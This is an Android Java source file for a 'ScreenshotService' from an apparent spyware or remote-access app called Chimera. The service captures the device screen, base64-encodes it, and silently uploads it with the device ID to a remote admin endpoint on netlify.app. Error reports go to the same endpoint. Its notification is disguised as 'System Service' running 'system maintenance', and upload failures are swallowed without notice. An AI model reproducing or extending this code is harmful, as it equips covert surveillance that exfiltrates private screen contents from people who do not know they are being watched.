package com.chimera;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenshotService extends Service {

    private static final String TAG = "ScreenshotService";
    private static final String NOTIFICATION_CHANNEL_ID = "ChimeraServiceChannel";
    private static final int NOTIFICATION_ID = 1337;
    private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
    private static final String UPLOAD_FILE_URL = "https://chimeradmin.netlify.app/.netlify/functions/upload-file";

    private RequestQueue requestQueue;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    @Override
    public void onCreate() {
        super.onCreate();
        requestQueue = Volley.newRequestQueue(this);
        createNotificationChannel();
        
        Notification notification = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Performing system maintenance...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .build();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            } else {
                startForeground(NOTIFICATION_ID, notification);
            }
        } catch (Exception e) {
            submitErrorToServer("Failed to start Foreground Service: " + e.getMessage());
            stopAndCleanup();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ScreenshotService started.");
        startCapture();
        return START_NOT_STICKY;
    }

    private void startCapture() {
        if (MainActivity.projectionIntent == null) {
            submitErrorToServer("Screenshot failed: Permission not available.");
            stopAndCleanup();
            return;
        }
        
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        mediaProjection = manager.getMediaProjection(MainActivity.projectionResultCode, MainActivity.projectionIntent);

        if (mediaProjection == null) {
            submitErrorToServer("MediaProjection could not be retrieved.");
            stopAndCleanup();
            return;
        }
        
        MediaProjection.Callback callback = new MediaProjection.Callback() {
            @Override
            public void onStop() {
                super.onStop();
                stopAndCleanup();
            }
        };
        mediaProjection.registerCallback(callback, new Handler(Looper.getMainLooper()));
        
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay(
                "ChimeraScreenshot", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);

        imageReader.setOnImageAvailableListener(reader -> {
            Image image = null;
            Bitmap bitmap = null;
            try {
                image = reader.acquireLatestImage();
                if (image != null) {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * width;

                    bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                    
                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                    croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream);
                    String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
                    uploadFileToServer("screenshot", encodedImage);

                    croppedBitmap.recycle();
                }
            } catch (Exception e) {
                submitErrorToServer("Image processing failed: " + e.getMessage());
            } finally {
                if (bitmap != null) bitmap.recycle();
                if (image != null) image.close();
                stopAndCleanup();
            }
        }, new Handler(Looper.getMainLooper()));
    }

    private void stopAndCleanup() {
        Log.d(TAG, "Screenshot job finished. Stopping service.");
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
        if (mediaProjection != null) mediaProjection.stop();
        stopForeground(true);
        stopSelf();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    NOTIFICATION_CHANNEL_ID,
                    "System Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            getSystemService(NotificationManager.class).createNotificationChannel(serviceChannel);
        }
    }
    
    private void uploadFileToServer(String dataType, String base64Data) {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("fileData", base64Data);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, UPLOAD_FILE_URL, postData, r -> {}, e -> {});
            request.setRetryPolicy(new DefaultRetryPolicy(30000, 1, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
            requestQueue.add(request);
        } catch (JSONException e) { /* fail silently */ }
    }

    private void submitErrorToServer(String errorMessage) {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("dataType", "screenshot_error");
            postData.put("payload", errorMessage);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData, r -> {}, e -> {});
            requestQueue.add(request);
        } catch (JSONException e) { /* fail silently */ }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
